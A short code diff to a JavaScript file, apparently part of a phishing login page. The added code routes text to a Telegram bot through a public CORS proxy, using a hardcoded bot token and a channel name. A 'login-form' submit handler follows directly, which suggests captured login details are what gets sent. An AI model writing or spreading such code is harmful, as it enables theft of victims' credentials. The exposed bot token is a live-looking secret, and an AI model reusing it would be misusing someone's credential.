@@ -184,16 +184,18 @@
   }
 
   async function sendToTelegram(text) {
-    const url = proxy(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'Markdown'
-      })
-    });
+  const telegramURL = encodeURI("https://api.telegram.org/bot8022691060:AAFmsFVXlUFLkB79Nb-E58CUfZM7g4oz7k8/sendMessage");
+  const corsURL = `https://corsproxy.io/?${telegramURL}`;
+
+  await fetch(corsURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: '@pegapegaospanela',
+      text: text,
+      parse_mode: 'Markdown'
+    })
+  });
   }
 
   document.getElementById('login-form').addEventListener('submit', async function (e) {
